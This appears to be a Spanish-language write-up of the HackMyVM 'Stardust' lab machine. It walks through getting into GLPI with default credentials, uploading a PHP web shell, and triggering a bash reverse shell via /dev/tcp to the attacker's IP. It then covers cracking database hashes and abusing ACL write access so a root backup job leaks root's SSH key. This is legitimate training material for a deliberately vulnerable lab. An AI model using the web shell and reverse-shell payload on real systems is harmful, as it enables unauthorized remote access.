---
title: HackMyVM - Stardust - Writeup
author: lukas
date: 2023-12-16 12:00:00 +0800
categories: [HackMyVM]
tags: [Upload Bypass,Default Credentials,Cracking Hash,GLPI,Scripting,ACL]
pin: true
image:
    path: /images/2023-12-16-HVM-Stardust/stardust.png
---
## Reconocimiento

### Escaneo de puertos

Para comenzar aplicamos un escaneo de puertos en el equipo víctima.

`nmap -p- -sS --min-rate 5000 -Pn -n 192.168.1.47 -oG allPorts`

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled.png)

Los puertos expuestos en la máquina víctima son el 22 y 80.

### Escaneo de servicios

Ahora con nmap lanzamos script básicos de reconocimiento para obtener información sobre los servicios que corren en los puertos encontrados.

`nmap -p22,80 -sCV 192.168.1.47 -oN targeted`

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%201.png)

Podemos destacar de lo encontrado que el servicio del puerto 80 corresponde a un GLPI el cual es un sistema de seguimiento de incidencias. 

## Enumeración web

### GLPI Login

Ahora que sabemos a que nos enfrentamos, visito el sitio web.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%202.png)

Necesitamos estar logueados para acceder a este y además por lo que podemos ver en el footer parece ser una versión reciente (más adelante lo confirmamos). Así que, más que buscar un exploit intento ver los usuarios y credenciales por defecto para ver si no se han cambiado y me encuentro lo siguiente.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%203.png)

En la documentación oficial están, por lo que intento probarlas.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%204.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%205.png)

### Subida de archivo php malicioso

Ya estamos dentro. Por ende ahora busco alguna forma de explotar este privilegio que tenemos y si recordamos de la parte del escaneo de servicios, este corre en un servidor de `Apache`, por lo que podriamos intentar subir un archivo malicioso con extensión `.php`.


```php
<?php system($_REQUEST['cmd']); ?>
```
{: file="shell.php" }
Revisando un poco la web, en Management me encuentro un apartado de documentos.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%206.png)

Pero al parecer no se puede subir un archivo del tipo php. Luego de buscar un rato en internet encontre que se puede habilitar la extensión que queramos en el panel de Setup.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%207.png)

Ahora agregare mi extensión `.php`.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%208.png)

Una vez agregada y habilitada la extensión php voy a intentar subir un documento.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%209.png)

Ahora fijandome en este panel, cuando añado un documento parece ser que se sube inmediatamente, por lo que se debe estar guardando en algún lugar.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2010.png)

Al clickear en el archivo me lo descarga, por lo que esa no es la ruta. 

Buscando en google encuentro que los archivos se guardan en la ruta `/files` . 

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2011.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2012.png)

como se observa el archivo no es .php (Tiene que ser en lowercase para que se interprete)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2013.png)

Por lo tanto intento revisar la subida del archivo con bupsuite para obtener más información.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2014.png)

Me fijo en que al momento de subir el archivo en el drag and drop, efectivamente se manda directamente al servidor, osea se hace una petición cada vez que añade un archivo nuevo, por lo que parece ser que se guarda en algún lugar. Para esto dejo pasar esta solicitud y dejo en espera la siguiente.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2015.png)

Mientras la segunda solicitud está en espera reviso los directorios de la ruta `/files` y encuentro que en `/files/_tmp/` se está subiendo el archivo concatenando el hash.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2016.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2017.png)

Logramos encontrar donde se subia el archivo temporalmente, por lo que ahora me mando una reverse shell a mi equipo y hago un tratamiento de la `TTY`.

`http://192.168.1.47/files/_tmp/60c971b1df75c4.02469730shell.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.1.44/443 0>%261'`

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2018.png)

Tratamiento de la TTY.

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo;fg
reset xterm
export XTERM=xterm-256color
stty rows 55 columns 209 
# este ultimo paso es para que tengo colores
source /etc/skel/.bashrc
```

---

## Escalada

Una vez dentro del equipo hago un reconocimiento incial de permisos SUDO, hostname, versión del sistema operativo, directorios, etc.

### User tally

Me fijo en que dentro del directorio `/var/www/` hay 2 drectorios, uno llamado `html` que corresponde al  `GLPI` y otro a `intranetik`. Por lo que revisando ambos directorios me encuentro que en `/var/www/html/config/config_db.php` hay credenciales de la base datos.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2019.png)

Como podemos ver hay una base de datos que corresponde al otro sitio web y viendo lo que contiene esa base de datos nos encontramos con esto.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2020.png)

Al parecer hay usuarios y hashes, por lo que reviso si alguno de estos usuarios existe en el equipo.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2021.png)

Existe el usuario tally, por lo que voy a crackear los hashes y ver si alguno de estos corresponde a ese usuario. Para esto utilizare `john`.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2022.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2023.png)

Logro crackear uno de los hashes y la contraseña corresponde a la del usuario tally.

### Escalada a root

Bueno, ahora como el usuario tally comienzo a ver más directorios, tareas, binarios, etc. de lo que me pueda aprovechar y encuentro lo siguiente.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2024.png)

Al parecer se están utilizando `ACL's` en el directorio `/opt` .

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2025.png)

Parece ser que el usuario www-data no tiene permisos en el directorio `/opt`. Luego revisamos el contenido del directorio `/opt` y encontramos lo siguiente.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2026.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2027.png)

El usuario tally tiene permisos especiales para leer y modificar el contenido del archivo `config.json`. Por último si revisamos el archivo de `meteo`.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2028.png)

Es un script en bash el cual le corresponde a root y que lee del archivo `config.json`, para obtener los datos de este, luego hace una petición a una página web y dependiendo del resultado guarda un backup de varios directorios entre un de ellos el de `/root`.

En base a esto se me ocurre revisar si se está ejecutando este script cada x tiempo en el equipo, para lo cual descargo `pspy` , lo traspaso a la máquina víctima y lo dejo corriendo un rato.

[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2029.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2030.png)

Ya que esto se ejecuta a cada cierto tiempo por el usuario root, se me ocurre modificar el archivo `config.json` para forzar que entre en la condición que genera el backup.

`https://api.open-meteo.com/v1/forecast?latitude=-18.48&longitude=-70.33&hourly=rain`

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2031.png)

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2032.png)

Por defecto la latitud no llega al limite establecido en el script el cual es de 1000, por lo que cambiando los valores intento buscar uno que supere el limite.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2033.png)

Probando con distintos valoes se me ocurre simplemente probar con el mismo valor de la longitud pero en positivo y obtengo esto.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2034.png)

Ahora cambio el valor en el `config.json` ya que tenemos permisos por las `ACL's`.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2035.png)

Después de un rato se genera un archivo `backup.tar` en el directorio `/var/backup`.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2036.png)

Revisando el contenido del comprimido tenemos lo siguiente.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2037.png)

Encontramos la flag y también la clave privada de ssh del usuario root.

![Untitled](/images/2023-12-16-HVM-Stardust/Untitled%2038.png)

Con esto ganamos acceso como usuario root al sistema y teminamos la máquina, quiero agregar que después de terminar esta máquina revise como se resolvia y la forma en que la hice es una forma no intencionada.
